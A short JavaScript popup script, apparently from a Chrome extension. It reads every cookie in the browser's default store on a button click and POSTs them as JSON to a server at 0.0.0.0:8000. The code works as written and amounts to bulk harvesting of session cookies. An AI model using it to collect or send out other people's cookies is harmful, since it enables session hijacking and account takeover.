document.addEventListener('DOMContentLoaded', function() {
    var extractButton = document.getElementById('extract-cookies-button');
    var statusField = document.getElementById('status');
  
    extractButton.addEventListener('click', function() {
      extractButton.disabled = true;
      statusField.innerHTML = 'Extracting cookies...';
  
      chrome.cookies.getAll({"storeId": "0"}, function(cookies) {
        var cookieData = JSON.stringify(cookies);
        console.log(cookieData)
  
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://0.0.0.0:8000/');
        xhr.setRequestHeader('Content-Type', 'application/json');
  
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            extractButton.disabled = false;
            statusField.innerHTML = 'Cookies extracted and sent.';
          }
        }
  
        xhr.send(cookieData);
      });
    });
  });
  
